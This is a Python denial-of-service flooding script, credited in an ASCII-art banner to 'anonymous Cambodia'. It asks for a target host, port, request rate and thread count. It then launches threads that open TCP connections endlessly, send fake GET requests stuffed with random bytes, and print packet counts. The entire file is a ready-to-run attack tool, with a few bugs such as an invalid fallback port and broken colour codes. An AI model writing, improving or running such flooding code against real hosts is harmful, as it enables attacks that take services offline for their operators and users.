

import socket
import time
import os
import random

from threading import Thread

os.system("clear")

if not __name__ == "__main__":
    exit()
      
class ConsoleColors:
    HEADER = '\033[95mkra'
    OKBLUE = '\033[94mkra'
    OKGREEN = '\033[92'
    WARNING = '\033[93makra'
    FAIL = '\033[91m'
    BOLD = '\033[1makra'
    
print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
               
               
               
                           
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⠉⣉⣉⣉⣉⣉⣉⣉⡩⠙⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⡿⠟⢋⣡⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣄⣉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⣡⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠋⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ Cambodia ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠟⢡⣾⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣆⠙⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠃⣴⣿⣿⣿⡿⠛⠁⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠈⠙⠿⣿⣿⣿⣷⡀⠻⣿⣿⣿⣿⣿
⣿⣿⣿⡿⢁⣾⣿⠟⢁⡾⠁⢀⢴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⡀⠹⣆⠙⣿⣿⡄⠹⣿⣿⣿⣿
⣿⣿⡿⢁⣾⡿⡏⠀⣼⣁⡴⢫⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠀⣿⡆⠀⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢳⣄⣹⡀⠘⡿⣿  ⣿⣿⣿⣿
⣿⣿⠁⣾⡟⢹⡇⢠⠟⠉⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣡⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⠙⢇⠀⣿⠹⣿⡀⢻⣿⣿
⣿⡇⢸⣿⠂⢸⡇⠀⣠⡞⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠶⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⣦⡀⠀⣿⠀⢿⣧⠀⣿⣿
⢿⠀⣾⣿⠀⢸⣧⠞⠁⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⠙⢦⣿⠀⢸⣿⡄⢸⣿
⡇⢠⣿⢻⡄⠘⠁⢀⡴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠋⠀⣶⢻⡇⠀⣿
⡁⢸⡏⠘⣇⠀⢰⡟⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣿⣬⡉⣉⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠹⣦⠀⢠⡏⢘⣿⠀⣿
⠇⢸⣏⠀⢹⣆⠟⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⠉⠀⢰⣿⣟⡅⣝⣿⣿⠀⠈⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠘⣇⣾⠁⢸⣿⠀⣿
⠀⢸⣿⡄⠈⣿⠀⢀⣏⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⢺⣿⣿⡇⢻⣿⣿⠀⠀⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⢹⠏⠀⣾⣿⠀⣿
⡇⠘⣿⢷⡀⠈⠀⣼⠏⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠸⣿⡿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠇⢿⡀⠘⠀⣼⢿⡇⠀⣿
⣿⠀⢿⡈⠻⣆⠀⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⠀⠀⣿⠃⠀⠀⠀.  ⠀⠈⢐⣿⣿⣿⣿⣿⣿⣿⠀⢸⡇⢠⡾⠋⣸⠃⢸⣿⣿
⣿⡇⢸⣧⠀⠈⢷⡏⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡏⠀⢘⣷⠋⠀⣰⡟⠀⣿⣿
⣿⣿⡀⢻⣧⡀⠀⠙⠀⠐⣧⠹⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⢱⡇⠀⠜⠁⢀⣰⣿⠁⣸⣿⣿
⣿⣿⣷⡈⢿⡙⠳⣤⣀⠀⢿⡀⠹⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡿⠀⢾⠃⢀⣠⠶⠋⣽⠃⣰⣿⣿⣿
⣿⣿⣿⣷⡈⢷⣄⠀⠉⠛⢾⣇⠀⠹⣞⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠁⢠⣿⠞⠋⠁⢀⣾⠋⣰⣿⣿⣿⣿
⣿⣿⣿⣿⣷⡀⠻⣷⡦⣀⡀⠈⠃⠀⠙⣆⠉⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡞⠁⠀⠉⠀⣀⡤⣶⡿⠁⣰⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣆⠘⢿⣌⠙⠳⠶⠦⣤⣼⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣯⣤⣴⠶⠶⠛⢉⣾⠏⢀⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣷⣄⠙⢿⣦⣤⣀⣀⣀⣀⣠⣤⣤⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣦⣠⣤⣀⣀⣀⣀⣠⣤⣾⠟⢁⣴⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡉⠻⣦⣉⠙⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⢉⣩⠾⠋⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠉⠻⢶⣶⣶⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣶⣶⣶⣶⠞⠋⢁⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣈⡙⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠟⠋⣉⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣀⣀⣀⣀⣀⣀⣀⣀⣀⣠⣤⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                        🙏ខ្ញុំស្រលាញ់ប្រទេសកម្ពុជា🙏
                          anonymousx-sayermkra
                          
                          anonymous Cambodia ☺️🇰🇭☺️
               
               
               
               
               
      ''')
      
    
def getport():
    try:
        p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port:\r\n"))
        return p
    except ValueError:
        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default " + ConsoleColors.OKGREEN + "80")
        return 8000000

host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "ផ្ទះ ip :\r\n")
port = getport()
speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits Per Run:\r\n"))
threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count:\r\n"))

ip = socket.gethostbyname(host)

bytesToSend = random._urandom(2450)

i = 1000;



class Count:
    packetCounter = 1

def goForDosThatThing():
    try:
        while True:
            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                dosSocket.connect((ip, port))
                for i in range(speedPerRun):
                    try:
                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----🥀PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " -----🥀")
                        Count.packetCounter = Count.packetCounter + 1
                    except socket.error:
                        print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
                    except KeyboardInterrupt:
                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
            except socket.error:
                print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
            except KeyboardInterrupt:
                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
            dosSocket.close()
    except KeyboardInterrupt:
        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
try:
        
    print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
    _   _   _             _      ____  _             _   _             
   / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
  / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
 / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
/_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
                                                                 |___/ 
          ''')
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====    🇰🇭           ] 25%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========     🇰🇭     ] 50%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [=============== 🇰🇭     ] 75%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%")
    
    for i in range(threads):
        try:
            t = Thread(target=goForDosThatThing)
            t.start()
        except KeyboardInterrupt:
            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")    
except KeyboardInterrupt:
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")